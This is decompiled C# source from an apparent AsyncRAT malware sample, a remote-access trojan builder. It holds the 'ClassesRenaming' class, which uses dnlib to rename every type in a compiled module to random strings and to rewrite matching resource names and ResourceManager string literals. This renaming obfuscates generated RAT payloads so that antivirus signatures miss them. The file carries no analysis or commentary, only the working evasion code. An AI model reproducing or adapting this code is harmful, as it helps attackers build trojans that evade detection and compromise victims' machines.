// Decompiled with JetBrains decompiler
// Type: Server.RenamingObfuscation.Classes.ClassesRenaming
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using dnlib.DotNet;
using dnlib.DotNet.Emit;
using dnlib.Utils;
using Server.RenamingObfuscation.Interfaces;
using System.Collections.Generic;

namespace Server.RenamingObfuscation.Classes
{
  public class ClassesRenaming : IRenaming
  {
    private static Dictionary<string, string> _names = new Dictionary<string, string>();

    public ModuleDefMD Rename(ModuleDefMD module)
    {
      ModuleDefMD module1 = module;
      foreach (TypeDef type in ((ModuleDef) module1).GetTypes())
      {
        if (!type.IsGlobalModuleType && !UTF8String.op_Equality(type.Name, "GeneratedInternalTypeHelper") && !UTF8String.op_Equality(type.Name, "Resources"))
        {
          string str;
          if (ClassesRenaming._names.TryGetValue(UTF8String.op_Implicit(type.Name), out str))
          {
            type.Name = UTF8String.op_Implicit(str);
          }
          else
          {
            string randomString = Server.RenamingObfuscation.Classes.Utils.GenerateRandomString();
            ClassesRenaming._names.Add(UTF8String.op_Implicit(type.Name), randomString);
            type.Name = UTF8String.op_Implicit(randomString);
          }
        }
      }
      return ClassesRenaming.ApplyChangesToResources(module1);
    }

    private static ModuleDefMD ApplyChangesToResources(ModuleDefMD module)
    {
      ModuleDefMD resources = module;
      foreach (Resource resource in (LazyList<Resource>) ((ModuleDef) resources).Resources)
      {
        foreach (KeyValuePair<string, string> name in ClassesRenaming._names)
        {
          if (resource.Name.Contains(name.Key))
            resource.Name = resource.Name.Replace(name.Key, name.Value);
        }
      }
      foreach (TypeDef type in ((ModuleDef) resources).GetTypes())
      {
        foreach (PropertyDef property in (IEnumerable<PropertyDef>) type.Properties)
        {
          if (!UTF8String.op_Inequality(property.Name, "ResourceManager"))
          {
            IList<Instruction> instructions = property.GetMethod.Body.Instructions;
            for (int index = 0; index < ((ICollection<Instruction>) instructions).Count; ++index)
            {
              if (instructions[index].OpCode == OpCodes.Ldstr)
              {
                foreach (KeyValuePair<string, string> name in ClassesRenaming._names)
                {
                  if (instructions[index].Operand.ToString().Contains(name.Key))
                    instructions[index].Operand = (object) instructions[index].Operand.ToString().Replace(name.Key, name.Value);
                }
              }
            }
          }
        }
      }
      return resources;
    }
  }
}
